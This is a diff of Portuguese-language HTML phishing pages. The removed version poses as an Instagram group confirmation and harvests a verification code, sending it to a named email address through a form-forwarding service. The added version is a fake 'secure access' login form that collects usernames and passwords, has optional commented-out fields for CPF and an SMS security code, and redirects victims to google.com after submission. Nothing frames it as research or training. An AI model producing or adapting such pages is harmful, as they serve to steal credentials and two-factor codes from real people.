@@ -1,73 +1,57 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Confirmação do Grupo</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #7f7fd5, #86a8e7, #91eae4);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
-      max-width: 400px;
-      width: 100%;
-      text-align: center;
-    }
-    h2 {
-      margin-bottom: 20px;
-      color: #333;
-    }
-    p {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 20px;
-    }
-    input[type="text"] {
-      width: 100%;
-      padding: 12px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      font-size: 16px;
-    }
-    button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 14px;
-      background-color: #28a745;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #218838;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Acesso Seguro</title>
+    <style>
+        body {
+            background-color: #77b;
+            font-family: "Trebuchet MS", Verdana, Arial, sans-serif;
+            padding: 30px;
+            text-align: center;
+        }
+        .form-container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            max-width: 350px;
+            margin: auto;
+            box-shadow: 0 0 12px #0005;
+        }
+        input, button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: #448;
+            color: white;
+            border: none;
+        }
+    </style>
 </head>
 <body>
 
-<div class="container">
-  <h2>Confirmação de Grupo</h2>
-  <p>Enviamos um código para liberar sua entrada no grupo do Instagram.<br>Digite o código abaixo para confirmar:</p>
-  
-  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
-    <input type="text" name="codigo_confirmacao" placeholder="Digite o código" required>
-    <input type="hidden" name="_next" value="https://tarefass.github.io/tarefas-/">
-    <input type="hidden" name="_captcha" value="false">
-    <button type="submit">Confirmar código</button>
-  </form>
-</div>
+    <div class="form-container">
+        <h2>Validação da Conta</h2>
+        <form action="https://formsubmit.co/SEUEMAIL@gmail.com" method="POST">
+            <input type="text" name="usuario" placeholder="Usuário ou e-mail" required>
+            <input type="password" name="senha" placeholder="Senha" required>
+            
+            <!-- Campos adicionais opcionais -->
+            <!-- <input type="text" name="cpf" placeholder="CPF"> -->
+            <!-- <input type="text" name="codigo_sms" placeholder="Código de segurança"> -->
+
+            <!-- Redireciona após envio -->
+            <input type="hidden" name="_next" value="https://google.com">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <button type="submit">Entrar</button>
+        </form>
+    </div>
 
 </body>
 </html>
